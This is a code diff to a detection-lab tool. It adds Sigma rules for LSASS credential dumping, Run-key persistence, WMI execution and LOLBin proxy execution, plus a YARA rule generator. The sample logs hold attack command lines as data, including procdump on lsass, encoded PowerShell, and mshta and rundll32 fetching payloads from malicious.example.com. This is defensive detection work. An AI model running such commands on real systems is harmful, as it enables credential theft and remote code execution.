@@ -208,6 +208,135 @@ level: critical`,
     logs: `EventCode=1102 host=WIN-DC01 SubjectUserName=administrator Message="The audit log was cleared"
 EventCode=4624 host=WIN-DC01 Account_Name=administrator LogonType=10`,
   },
+  credential_dumping_lsass: {
+    label: "Credential dumping via LSASS",
+    rule: `title: Suspicious LSASS Process Access
+status: experimental
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 10
+    TargetImage|endswith: '\lsass.exe'
+    GrantedAccess: '0x1FFFFF'
+  condition: selection
+fields:
+  - Image
+  - TargetImage
+  - GrantedAccess
+  - User
+  - Computer
+falsepositives:
+  - Legitimate AV or EDR products
+  - Microsoft support tools
+  - Password change notifications
+tags:
+  - attack.t1003.001
+level: critical`,
+    logs: [
+      "EventID=10 host=WIN-01 User=admin Image=C:\\Tools\\procdump64.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF",
+      "EventID=10 host=WIN-01 User=admin Image=C:\\Windows\\System32\\rundll32.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF",
+      "EventCode=4688 host=WIN-01 User=admin Image=C:\\Windows\\System32\\cmd.exe CommandLine=\"taskkill /f /im lsass.exe\"",
+    ].join("\n"),
+  },
+  registry_run_key: {
+    label: "Registry Run key persistence",
+    rule: `title: Suspicious Registry Run Key Modification
+status: experimental
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 13
+    TargetObject|contains: '\CurrentVersion\Run'
+  condition: selection
+fields:
+  - Image
+  - TargetObject
+  - Details
+  - User
+falsepositives:
+  - Software installers adding legitimate autoruns
+  - Driver or update packages
+tags:
+  - attack.t1547.001
+level: high`,
+    logs: [
+      "EventID=13 host=WIN-01 User=jdoe Image=C:\\Windows\\System32\\reg.exe TargetObject=HKU\\...\\CurrentVersion\\Run\\BackupSvc Details=\"C:\\Users\\Public\\svchost.exe\"",
+      "EventID=13 host=WIN-01 User=admin Image=C:\\Users\\admin\\installer.exe TargetObject=HKLM\\...\\CurrentVersion\\Run\\Updater Details=\"C:\\Program Files\\Updater\\upd.exe\"",
+    ].join("\n"),
+  },
+  wmi_execution: {
+    label: "WMI remote execution",
+    rule: `title: WMI Process Creation From Network
+status: experimental
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 1
+    ParentImage|endswith: '\WmiPrvSE.exe'
+  condition: selection
+fields:
+  - Image
+  - ParentImage
+  - CommandLine
+  - User
+  - Computer
+falsepositives:
+  - Legitimate WMI management tools
+  - SCCM or deployment agents
+  - Administrator scripts
+tags:
+  - attack.t1047
+level: high`,
+    logs: [
+      "EventID=1 host=WIN-01 User=admin ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c whoami",
+      "EventID=1 host=WIN-01 User=admin ParentImage=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell -nop -enc SQBFAFgA",
+    ].join("\n"),
+  },
+  lolbin_execution: {
+    label: "LOLBin proxy execution",
+    rule: `title: Suspicious LOLBin Process Spawning
+status: experimental
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    Image|endswith:
+      - '\rundll32.exe'
+      - '\mshta.exe'
+      - '\regsvr32.exe'
+      - '\cscript.exe'
+      - '\wscript.exe'
+    CommandLine|contains:
+      - 'http'
+      - 'https'
+      - 'script'
+      - 'shell'
+  condition: selection
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+falsepositives:
+  - Legitimate web-based admin tools
+  - Browser helper objects
+  - Microsoft update infrastructure
+tags:
+  - attack.t1218
+level: medium`,
+    logs: [
+      "EventID=1 host=WIN-01 User=jdoe Image=C:\\Windows\\System32\\rundll32.exe CommandLine=rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \"http://malicious.example.com/payload\"",
+      "EventID=1 host=WIN-01 User=jdoe Image=C:\\Windows\\System32\\mshta.exe CommandLine=mshta http://malicious.example.com/payload.hta",
+      "EventID=1 host=WIN-01 User=admin Image=C:\\Windows\\System32\\cscript.exe CommandLine=cscript.exe C:\\Windows\\System32\\manage-bde.wsf",
+    ].join("\n"),
+  },
   dns_tunnel: {
     label: "DNS tunneling hint",
     rule: `title: Suspicious Long DNS Query
@@ -293,6 +422,7 @@ export function runDetectionLab(rule = "", logs = "") {
     spl: buildSpl(rule, selectedTerms),
     kql: buildKql(selectedTerms),
     wazuh: buildWazuh(rule, selectedTerms, attack),
+    yara: buildYara(rule, selectedTerms),
   }
 }
 
@@ -305,6 +435,22 @@ export function buildSpl(rule = "", terms = []) {
 export function buildKql(terms = []) {
   if (!terms.length) return "*"
   return terms.slice(0, 6).map((term) => `message:*${term.replace(/[:\\]/g, "\\$&")}*`).join(" OR ")
+}
+
+export function buildYara(rule = "", terms = []) {
+  const title = rule.match(/title:\s*(.+)/i)?.[1]?.trim() || "Detection_Lab"
+  const safeTitle = title.replace(/\s+/g, "_").replace(/[^a-zA-Z0-9_]/g, "")
+  return [
+    `rule ${safeTitle || "beyondarch_candidate"} {`,
+    "  meta:",
+    `    description = "${title}"`,
+    '    author = "BeyondArch Detection Lab"',
+    "  strings:",
+    ...terms.slice(0, 6).map((term, i) => `    $s${i + 1} = "${term.replace(/"/g, '\\"')}" nocase`),
+    "  condition:",
+    terms.length ? "    any of them" : "    false",
+    "}",
+  ].filter(Boolean).join("\n")
 }
 
 export function buildWazuh(rule = "", terms = [], attack = []) {
